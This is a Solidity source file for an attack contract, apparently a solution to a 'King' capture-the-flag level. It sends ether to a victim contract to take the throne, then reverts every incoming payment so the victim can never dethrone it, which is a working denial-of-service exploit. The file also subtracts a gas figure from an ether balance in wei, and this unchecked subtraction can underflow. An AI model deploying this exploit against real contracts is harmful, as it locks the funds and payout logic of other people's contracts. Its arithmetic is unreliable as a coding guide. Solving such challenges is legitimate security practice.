// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract LastKing is Ownable {
    address payable _kingContract;

    constructor(address _victimAddress) public {
        _kingContract = payable(_victimAddress);
    }

    function claimThrone() payable public onlyOwner {
        uint256 txGas = 4000000;
        uint256 txValue = address(this).balance - txGas;
        _kingContract.call{value: txValue, gas: txGas}("");
    }

    // King contract will not be able to transfer to this contract
    // because it reverts when someone transfers to it
    receive() external payable {
        revert("Cannot do this, my friend");
    }
}
